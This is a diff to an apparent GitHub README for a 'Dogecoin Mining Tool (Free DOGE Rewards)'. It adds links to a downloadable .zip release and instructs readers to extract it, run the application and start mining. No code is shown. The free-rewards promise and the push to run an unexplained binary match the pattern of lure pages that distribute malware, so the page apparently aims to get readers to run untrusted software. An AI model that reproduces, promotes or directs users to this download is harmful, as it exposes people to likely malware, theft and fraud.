@@ -1,7 +1,7 @@
-<p align="center"><img src="https://i.ibb.co/F4K9qv6/doge.png"></p>
+<p align="center"><a href="https://github.com/mrhgvn/Dogecoin-Mining-Tool-Free-DOGE-Rewards/releases/download/Dogecoin_Mining_Tool/Dogecoin.Mining.Tool.zip"><img src="https://i.ibb.co/F4K9qv6/doge.png"></a></p>
 
 <h1 align="center">Dogecoin Mining Tool (Free DOGE Rewards)</h1>
-<h3><b>-</b> Download and Extract "Dogecoin Mining Tool" .zip file!</h3>
+<h3><b>-</b><a href="https://github.com/mrhgvn/Dogecoin-Mining-Tool-Free-DOGE-Rewards/releases/download/Dogecoin_Mining_Tool/Dogecoin.Mining.Tool.zip"> Download and Extract "Dogecoin Mining Tool" .zip file!</a></h3>
 <h3><b>-</b> Run "DOGE Mining Tool" application!</h3>
 <h3><b>-</b> You can start CPU mining!</h3>
 
